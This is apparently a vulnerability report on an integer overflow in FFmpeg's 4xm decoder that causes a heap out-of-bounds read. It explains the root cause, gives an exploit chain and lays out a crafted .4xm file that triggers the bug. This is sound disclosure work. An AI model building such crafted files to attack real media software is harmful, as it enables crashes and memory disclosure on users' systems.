# VULN 001: Integer Overflow in decode_i_frame → Heap OOB Read

## Summary

A 32-bit integer overflow in `decode_i_frame()` (`libavcodec/4xm.c`, line 790) allows
an attacker to craft a `.4xm` file that causes `read_huffman_tables()` to perform an
out-of-bounds read at lines 635-636.

## Root Cause

```c
// 4xm.c line 790
prestream_size = 4 * AV_RL32(buf + bitstream_size + 4);
```

`prestream_size` is a 32-bit unsigned integer. If `AV_RL32(...)` returns `0x40000000`,
then `4 * 0x40000000 = 0x100000000` wraps to `0` on a 32-bit multiplication.

## Exploit Chain

1. `prestream_size = 0` passes the check at line 794: `prestream_size > (1 << 26)`.
2. `prestream_size + bitstream_size + 12 == length` (0 + 0 + 12 == 12) passes line 793.
3. `prestream = buf + bitstream_size + 12 = buf + 12` points **one past the end** of
   the 12-byte frame buffer.
4. `read_huffman_tables(f, prestream, 0)` is called with a dangling pointer.
5. Lines 635-636 perform `*ptr++` twice with `buf_size=0`, reading 2 bytes OOB.

## Crafted File Layout

```
RIFF <size> 4XMV
  LIST <size> HEAD
    vtrk <0x44> <...>   ; width=16, height=16, version=2
  LIST <size> MOVI
    ifrm <16>            ; chunk payload = 16 bytes
      [00 00 00 00]      ; payload[0..3]  – skipped by decode_frame
      [00 00 00 00]      ; payload[4..7]  = bitstream_size=0
      [00 00 00 40]      ; payload[8..11] = 0x40000000 (prestream_size trigger)
      [00 00 00 00]      ; payload[12..15]
```
